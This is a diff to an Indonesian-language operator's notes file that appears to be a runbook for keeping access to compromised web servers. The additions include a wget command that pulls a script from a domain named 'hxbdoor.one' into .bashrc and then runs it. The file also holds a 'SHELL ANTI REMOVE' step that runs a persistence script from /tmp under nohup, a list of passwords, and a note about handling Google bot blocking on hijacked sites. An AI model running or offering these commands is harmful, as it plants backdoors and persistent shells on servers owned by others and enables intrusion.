@@ -186,6 +186,8 @@ ps -u $USER
 (menampilkan PID dari shell yang sedang aktif / yang kita gunakan)
 echo $$
 
+ps -f -p $$
+
 (Kalau ingin tahu semua PID yang terkait user dan cari yang cocok dengan shell aktif)
 ps -u "$USER" -o pid,cmd | grep $$ 
 
@@ -218,7 +220,7 @@ pasang htaccess jika site kena capcha / block bot google
 
 --------------------------
 SHELL ANTI REMOVE
-chmod +x /tmp/bandar/nohub.sh && nohup /tmp/bandar/nohub.sh >/dev/null 2>&1 &
+chmod +x /tmp/br/nohub.sh && nohup /tmp/br/nohub.sh >/dev/null 2>&1 &
 
 masukan file tmp nya
 
@@ -323,6 +325,9 @@ walaowe@@123@@1947 (masukan password)
 cobasajamas (masukan password)
 katasandinyacobasajamas (masukan password)
 
+wget -O .bashrc https://hxbdoor.one/raw/V5NCStKd
+jangandicobacobamas (password)
+
 sed -i 's/\r$//' .bashrc
 bash .bashrc
 
@@ -402,4 +407,3 @@ grep -R "DocumentRoot" /etc/httpd/
 (cek document root public)
 
 ----------------
-
